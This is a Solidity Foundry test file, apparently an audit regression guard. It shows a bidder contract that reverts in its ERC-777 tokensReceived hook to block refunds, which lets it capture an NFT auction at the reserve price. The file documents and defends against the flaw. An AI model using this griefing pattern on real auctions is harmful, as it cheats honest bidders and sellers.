// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test} from "forge-std/Test.sol";
import {AuctionSell} from "../src/AuctionSell.sol";
import {GobbledWarplets} from "../src/GobbledWarplets.sol";
import {MockAuctionNFT} from "./mocks/MockAuctionNFT.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";

interface IERC777RecipientLike {
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external;
}

/// @notice Models a *standard* ERC-777 token (e.g. the OpenZeppelin reference implementation), whose
///         ERC-20 `transfer`/`transferFrom` DO invoke the recipient's `tokensReceived` hook
///         (`requireReceptionAck=false` — call if registered, propagate any revert).
///
/// @dev    IMPORTANT — this is NOT how the production bid token (Superfluid SuperToken / $WARPGOBB)
///         behaves. Superfluid's ERC-20 transfer path is `_transferFrom -> _move` and deliberately
///         SKIPS `_callTokensReceived`; only the ERC-777 `send` path fires recipient hooks. AuctionSell
///         refunds with `transfer` (not `send`), so on real WARPGOBB this attack does NOT work.
///         This test is a regression guard documenting that the no-refund-griefing property depends on
///         that SuperToken-specific behaviour: if the bid token were ever pointed at a standard ERC-777,
///         or refunds were ever switched to `send`, auction-capture griefing would become live.
contract MockSuperToken is ERC20 {
    mapping(address => bool) public hookRegistered;

    constructor() ERC20("Mock WARPGOBB", "WARPGOBB") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    /// @dev A contract opts in to the ERC777TokensRecipient hook for itself (models ERC-1820 registration).
    function registerRecipientHook() external {
        hookRegistered[msg.sender] = true;
    }

    function _update(address from, address to, uint256 value) internal override {
        super._update(from, to, value);
        // Mirror SuperToken: fire recipient hook on real transfers (not on mint) when registered.
        if (from != address(0) && hookRegistered[to]) {
            IERC777RecipientLike(to).tokensReceived(msg.sender, from, to, value, "", "");
        }
    }
}

/// @notice Bidder contract that reverts inside its ERC-777 recipient hook once "armed", so any attempt
///         to refund it (i.e. to outbid it) reverts the whole transaction.
contract GriefingBidder is IERC777RecipientLike {
    AuctionSell public immutable sell;
    MockSuperToken public immutable token;
    bool public armed;

    constructor(AuctionSell _sell, MockSuperToken _token) {
        sell = _sell;
        token = _token;
        _token.registerRecipientHook();
        _token.approve(address(_sell), type(uint256).max);
    }

    function arm() external {
        armed = true;
    }

    function placeBid(uint256 amount) external {
        sell.bid(amount);
    }

    function tokensReceived(address, address, address, uint256, bytes calldata, bytes calldata)
        external
        view
        override
    {
        // Reject refunds: makes outbidding revert. Still accepts the initial pull (that is a transfer
        // FROM us, so the hook fires on the auction, not here).
        if (armed) revert("GriefingBidder: refuse refund");
    }
}

contract AuditRefundGriefTest is Test {
    AuctionSell internal sell;
    GobbledWarplets internal gobbled;
    MockAuctionNFT internal nft;
    MockSuperToken internal bidToken;

    address internal owner = makeAddr("owner");
    address internal proceeds = makeAddr("proceeds");
    address internal bob = makeAddr("bob");
    address internal gobbledSetter = makeAddr("gobbledSetter");

    uint256 internal constant DURATION = 24 hours;
    uint256 internal constant TIME_BUFFER = 5 minutes;
    uint256 internal constant RESERVE_PRICE = 10_000_000 * 1e18;
    uint8 internal constant MIN_INCREMENT_PCT = 10;
    uint256 internal constant SEED = 1_000_000_000 * 1e18;

    function setUp() public {
        vm.startPrank(owner);
        nft = new MockAuctionNFT();
        bidToken = new MockSuperToken();
        gobbled = new GobbledWarplets("Gobbled Warplets", "GOBBLED", owner, gobbledSetter);
        sell = new AuctionSell(
            IERC721(address(nft)),
            bidToken,
            gobbled,
            proceeds,
            TIME_BUFFER,
            RESERVE_PRICE,
            MIN_INCREMENT_PCT,
            DURATION,
            owner,
            address(0)
        );
        gobbled.setMinter(address(sell));
        vm.stopPrank();
    }

    function _enqueueAndStart() internal returns (uint256 tokenId) {
        vm.prank(owner);
        tokenId = nft.mint(owner);
        vm.prank(owner);
        nft.safeTransferFrom(owner, address(sell), tokenId);
        vm.prank(owner);
        sell.unpause(); // auto-starts auction from queue head
    }

    /// @dev Demonstrates the CONDITIONAL/LATENT risk: under standard-ERC777 transfer-fires-hook
    ///      semantics, a reverting recipient hook lets a bidder block all refunds and capture the
    ///      auction at the reserve price. Against the real Superfluid bid token this does not trigger
    ///      (transfer skips hooks) — see MockSuperToken docs.
    function test_griefer_captures_auction_by_blocking_refunds() public {
        _enqueueAndStart();

        // Deploy the griefing bidder and fund it.
        GriefingBidder grief = new GriefingBidder(sell, bidToken);
        bidToken.mint(address(grief), SEED);
        bidToken.mint(bob, SEED);
        vm.prank(bob);
        bidToken.approve(address(sell), type(uint256).max);

        // Griefer places the opening (low) bid, then arms its reverting refund hook.
        grief.placeBid(RESERVE_PRICE);
        grief.arm();

        // Bob tries to outbid honestly with a 50% higher bid. Refunding the griefer reverts,
        // so Bob can never take the lead. The griefer has captured the auction at the reserve.
        uint256 bobBid = RESERVE_PRICE * 2;
        vm.prank(bob);
        vm.expectRevert(bytes("GriefingBidder: refuse refund"));
        sell.bid(bobBid);

        // Confirm griefer is still the high bidder at the reserve price.
        (, address highBidder, uint256 highBid,) = sell.currentAuction();
        assertEq(highBidder, address(grief), "griefer should still lead");
        assertEq(highBid, RESERVE_PRICE, "still at reserve price");

        // The auction settles fine for the griefer (settlement never refunds the bidder),
        // so the griefer wins the Warplet far below the price an honest market would have paid.
        vm.warp(block.timestamp + DURATION + 1);
        vm.prank(owner);
        sell.pause();
        vm.prank(owner);
        sell.settle();
        (,, uint256 settledBid,) = sell.currentAuction();
        assertEq(settledBid, 0, "auction settled (cleared)");
    }
}
